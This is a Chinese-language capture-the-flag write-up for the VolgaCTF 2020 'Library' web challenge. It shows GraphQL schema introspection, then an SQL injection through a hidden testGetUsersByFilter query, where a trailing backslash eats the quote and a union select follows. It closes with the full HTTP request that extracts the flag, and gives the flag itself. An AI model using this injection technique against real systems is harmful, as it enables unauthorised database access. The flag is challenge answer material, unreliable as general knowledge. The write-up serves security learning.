# VolgaCTF Qualifier - 2020

## Web / 150 - Library

>
> We have written a pretty useful library website where you can find all our books.
> URL: http://library.q.2020.volgactf.ru:7781/
>

### Solution

By [@Cyku](https://cyku.tw)

原文連結：[https://cyku.tw/volgactf-2020-qualifier/](https://cyku.tw/volgactf-2020-qualifier/)

---

這題一個簡單的登入、登出功能，登入後就可以看到有儲存書籍的列表。

![Library_01](Library_01.png)

其中背後查詢列表的 API 是透過 GraphQL 來查詢。

![Library_02](Library_02.png)

對於測試 GraphQL API 的起手式就是可以利用內建 Introspection 操作來請求取得所有 Query / Mutation 的 schema，嘗試找出隱藏、可以利用的 API。為了方便性，所以我使用 [GraphQL CLI](https://github.com/Urigo/graphql-cli) 這套工具來協助完成操作。

只要依照順序執行下面兩個指令，就能獲得目標上 GraphQL API 完整的 schema：
```bash
# 產生 .graphqlconfig 設定檔
$ graphql init  

# 取得 schema
$ graphql get-schema
```

![Library_03](Library_03.png)

而我取得的 schema 如下所示：
```graphql
# source: http://library.q.2020.volgactf.ru:7781/api
# timestamp: Sat Mar 28 2020 20:23:14 GMT+0800 (GMT+08:00)

type Book {
  title: String!
  author: String!
  pic: String!
}

type LoginResponse {
  login: String
  name: String
  email: String
  token: String
}

input LoginUser {
  login: String
  password: String
}

type Mutation {
  _empty: String
  register(user: RegisterUser): String
}

type Query {
  _empty: String
  login(user: LoginUser): LoginResponse
  testGetUsersByFilter(filter: UserFilter): [User]
  books: [Book]
}

input RegisterUser {
  login: String
  password: String
  name: String
  email: String
}

type User {
  login: String
  name: String
  email: String
}

input UserFilter {
  login: String
  name: String
  email: String
}
```

其中發現一個有趣的 Query testGetUsersByFilter，這個 Query 可以利用 login、name、email 等三個欄位來查詢存在系統上的使用者，總而言之、言而總之，經過一番黑箱測試後我們發現有 SQL Injection XD，目標會刪除單引號字元，但可以用反斜線 \ 去把後方的單引號吃掉。

黑箱猜測會組成類似如下的 SQL：
```SQL
SELECT * FROM users WHERE login = '$login' AND name = '$name'
```

所以讓 $login = `meow\` 而 $name = `union select 1,2,3,4,user(),6#` 就可以組合出：
```SQL
SELECT * FROM users WHERE login = 'meow\' AND name = 'union select 1,2,3,4,user(),6#'
```

就能利用 union 進行查詢以取得資料庫內容，而剩下的就是一些標準動作了。

![Library_04](Library_04.png)

最後取得 flag 的 Payload:

```plaintext
POST /api HTTP/1.1
Host: library.q.2020.volgactf.ru:7781
Accept: application/json
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://library.q.2020.volgactf.ru:7781/index.html
content-type: application/json
authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Indvb2ZAbWFpbGluYXRvci5jb20iLCJuYW1lIjoid29vZiIsImxvZ2luIjoid29vZiIsImlhdCI6MTU4NTQ4OTA2MywiZXhwIjoxNTg1NDkyNjYzfQ.D54N_s5LVyUp7LXLZrwimAoA0bDi6WKACTv3NbOEpT0
origin: http://library.q.2020.volgactf.ru:7781
Content-Length: 272
Connection: close

{
    "query":"query testGetUsersByFilter($input: UserFilter) {testGetUsersByFilter(filter: $input){login name email}}",
    "variables":{
        "input":{
            "login":"meow\\",
            "name":"union select 1,2,3,4,flag,6 from flag#"
        }
    }
}
```

Flag：`VolgaCTF{EassY_GgraPhQl_T@@Sk_ek3k12kckgkdak}`
